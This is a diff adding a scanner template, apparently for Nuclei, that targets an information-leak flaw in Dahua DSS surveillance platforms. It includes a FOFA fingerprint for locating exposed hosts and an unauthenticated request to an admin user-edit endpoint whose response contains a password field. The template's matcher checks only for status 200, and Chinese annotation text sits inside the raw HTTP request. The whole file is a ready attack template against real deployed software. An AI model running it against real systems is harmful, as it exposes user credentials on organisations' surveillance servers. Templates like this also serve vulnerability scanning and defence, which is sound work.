@@ -1,0 +1,34 @@
+id: poc-elfowem7hg1zzn9e
+info:
+  name: 大华DSS信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/elfowem7hg1zzn9e'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: elfowem7hg1zzn9e
+    fofa: app="dahua-DSS"
+http:
+- raw:
+  - 'GET /admin/cascade_/user_edit.action?id=1 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    password
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
